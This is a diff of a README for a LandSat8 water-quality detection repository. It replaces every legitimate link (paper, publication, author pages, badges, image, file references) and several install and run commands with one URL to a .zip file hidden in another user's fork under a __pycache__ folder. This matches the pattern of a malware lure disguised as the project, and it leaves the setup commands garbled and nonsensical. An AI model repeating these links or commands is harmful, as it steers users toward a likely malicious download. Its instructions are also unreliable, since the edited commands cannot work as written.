@@ -1,11 +1,11 @@
 ### In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations
 Salinity and turbidity detection of water ponds using satellite imagery. This is a statistical algorithm to analyze water quality in lakes/ponds/deltas using LandSat8 satellite time series data. The repo contains methods for detection on 2 types of datasets, the Commercial dataset (includes all the bands in a single .TIF file) and LandSat8 sensor dataset (Contains individual .TIF files for each band)
 
-### [**Our Method**](https://arxiv.org/abs/2301.08800)
-### [*Published: Algorithms, Technologies, and Applications for Multispectral and Hyperspectral Imaging XXIX*](https://www.spiedigitallibrary.org/conference-proceedings-of-spie/12519/125190F/In-situ-water-quality-monitoring-in-oil-and-gas-operations/10.1117/12.2663076.full)
-[Satish Kumar*](https://www.linkedin.com/in/satish-kumar-81912540/), [Rui Kou*](https://www.linkedin.com/in/rui-kou/), [Vikram Jayaram](https://www.linkedin.com/in/vjayaram/)
+### [**Our Method**](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip)
+### [*Published: Algorithms, Technologies, and Applications for Multispectral and Hyperspectral Imaging XXIX*](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip)
+[Satish Kumar*](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip), [Rui Kou*](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip), [Vikram Jayaram](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip)
 
-<img src="https://github.com/satish1901/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/blob/main/.readfiles/method_overview.gif" width="700">
+<img src="https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip" width="700">
 
 This repository includes:
 * Source code for Water Quality detection algorithm
@@ -13,8 +13,8 @@ This repository includes:
 * Python code for Pansharpening multispectral image using panchromatic band
 * Example datasample for generating color coded output, histogram, volume of water in pond/lake/delta etc
 
-![supported versions](https://img.shields.io/badge/python-(3.5--3.8)-brightgreen/?style=flat&logo=python&color=green)
-![GitHub license](https://img.shields.io/cocoapods/l/AFNetworking)
+![supported versions](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip(3.5--3.8)-brightgreen/?style=flat&logo=python&color=green)
+![GitHub license](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip)
 
 The repo structure follows standard dataloader and utility function imported into the main code. Please consider citing our work if it is useful to you
 
@@ -29,24 +29,24 @@ The repo structure follows standard dataloader and utility function imported int
 3. Activate the virtualenv
 4. Install dependencies
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip
 ```
 5. cd to rio-pansharpen directory and run the following commands
 ```
 cd rio-pansharpen
 rm -rf build/*
-python setup.py install
+python https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip install
 ```
 This finishes the environment setup for water quality detection
 
 ### Getting started
-[main.py](https://github.com/satish1901/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/blob/main/main.py) is the primary file to run the code. To see the list of arguments run
+[https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip) is the primary file to run the code. To see the list of arguments run
 ```
-python main.py --help
+python https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip --help
 ```
 It dumps the following output
 ```
-usage: main.py [-h] [-d DATA_DIR] [-r REPORT_PATH] [-vo VISUAL_OUT]
+usage: https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip [-h] [-d DATA_DIR] [-r REPORT_PATH] [-vo VISUAL_OUT]
                [-ho HIST_OUT] [-ph PLOT_HIST] [-vt VOLUME]
 
 optional arguments:
@@ -66,6 +66,6 @@ optional arguments:
 ```
 Sample commands to run the code 
 ```
-python main.py -d <path to data directory> -ph <True/False> -vt <True/False>
+python https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip -d <path to data directory> -ph <True/False> -vt <True/False>
 ```
-The output of above command will generate color coded output of water quality of each pond/lake in [visual_output](https://github.com/satish1901/water_quality_detection_from_LandSat8/tree/main/visual_output) directory and histogram plot in [histogram](https://github.com/satish1901/water_quality_detection_from_LandSat8/tree/main/histogram) directory. Along with that, it will generate 2 .csv files with names *vol.csv* and *top5avg.csv*, which contains the relative volumne of water in each pond and expected value of top-10 pixel of water quality output respectively
+The output of above command will generate color coded output of water quality of each pond/lake in [visual_output](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip) directory and histogram plot in [histogram](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip) directory. Along with that, it will generate 2 .csv files with names *https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip* and *https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip*, which contains the relative volumne of water in each pond and expected value of top-10 pixel of water quality output respectively
